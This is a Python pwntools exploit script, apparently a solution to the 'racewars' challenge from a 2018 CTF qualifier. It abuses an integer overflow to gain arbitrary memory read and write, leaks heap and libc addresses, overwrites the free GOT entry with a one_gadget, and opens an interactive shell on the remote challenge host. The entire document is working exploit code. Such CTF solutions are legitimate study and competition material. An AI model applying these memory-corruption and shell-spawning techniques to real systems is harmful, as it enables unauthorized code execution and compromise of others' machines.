#!/usr/bin/env python
from pwn import *
from pow import solve_pow

def select_tires(num):
    s.sendlineafter('CHOICE: ','1')
    s.sendlineafter('need?\n',str(num))

def select_chassis():
    s.sendlineafter('CHOICE: ','2')
    s.sendlineafter('eclipse\n','1')

def select_engine():
    s.sendlineafter('CHOICE: ','3')

def select_transmission(transmission):
    s.sendlineafter('CHOICE: ','4')
    s.sendlineafter('transmission? ',str(transmission))

def tires(choice,val):
    s.sendlineafter('CHOICE: ','1')
    s.sendlineafter('CHOICE: ',str(choice))
    s.sendlineafter(': ',str(val))

def chassis():
    s.sendlineafter('CHOICE: ','2')
    s.sendlineafter(': ','1')

def engine():
    s.sendlineafter('CHOICE: ','3')

def transmission(index,yes,val = 0):
    s.sendlineafter('CHOICE: ','4')
    s.sendlineafter('modify? ',str(index))
    s.recvuntil('is ')
    ret = int(s.recvuntil(',')[:-1])
    s.sendlineafter('what?: ',str(val))
    s.sendlineafter('no)',str(yes))
    return ret

def newpart():
    s.sendlineafter('CHOICE: ','5')

def race():
    s.sendlineafter('CHOICE: ','6')

def leak(offset):
    ret = 0
    for i in range(8):
        ret = (ret << 8) + transmission(offset + 7 - i, 0)
    return ret

def overwrite(offset,val):
    for i in range(8):
        transmission(offset + i, 1, ord(p64(val)[i]))

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./racewars', env = {'LD_PRELOAD': './libc-2.23.so'})
    else:
        s = remote('2f76febe.quals2018.oooverflow.io',31337)
        s.recvuntil('Challenge: ')
        challenge = s.recvline(False)
        s.recvuntil('n: ')
        n = int(s.recvline(False))
        s.sendline(str(solve_pow(challenge,n)))

    elf = ELF('./racewars')
    libc = ELF('./libc-2.23.so')

    select_chassis()
    select_engine()
    select_tires(1<<29)
    select_transmission(1)

    for i in range(1,5):
        tires(i,0xffff)
    heap_addr = leak(-0x50) + 0x8
    log.info('heap address: %#x' % heap_addr)

    libc_base = leak(elf.got['printf'] - heap_addr) - libc.symbols['printf']
    log.info('libc base: %#x' % libc_base)

    one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    overwrite(elf.got['free'] - heap_addr, libc_base + one_gadget[1])

    race()

    s.interactive()
